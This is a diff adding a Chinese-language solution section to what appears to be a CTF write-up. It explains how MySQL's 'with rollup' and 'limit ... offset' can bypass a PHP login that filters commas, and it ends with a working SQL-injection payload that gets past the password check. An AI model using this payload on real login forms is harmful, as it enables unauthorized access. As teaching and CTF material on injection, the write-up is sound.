@@ -46,6 +46,42 @@ mysql_close($con);
 ?>
 ```
 # Solution
+
+用到mysql中的`with rollup`技巧。用普通的select查询下；
+```
+mysql> SELECT uname,pass FROM test.table;
++---------+------+
+| uname   | pass |
++---------+------+
+| chybeta | 123  |
++---------+------+
+1 row in set (0.00 sec)
+```
+在加上`group by pass with rollup`后
+```
+mysql> SELECT uname,pass FROM test.table group by pass with rollup;
++---------+------+
+| uname   | pass |
++---------+------+
+| chybeta | 123  |
+| chybeta | NULL |
++---------+------+
+2 rows in set (0.01 sec)
+```
+rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足`$key['pwd'] == $_POST['pwd']`的条件了。
+
+在此之前我们还有一个条件要满足`mysql_num_rows($query) == 1`，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用`limit 1,1`这样的语法，而是可以使用`limit 1 offset 1`。就本地环境而言，比如
+
+```
+mysql> SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;
++---------+------+
+| uname   | pass |
++---------+------+
+| chybeta | NULL |
++---------+------+
+1 row in set (0.01 sec)
+```
+
 payload:
 ```
 uname='  or 1=1 group by pwd with rollup limit 1 offset 2 #&pwd=
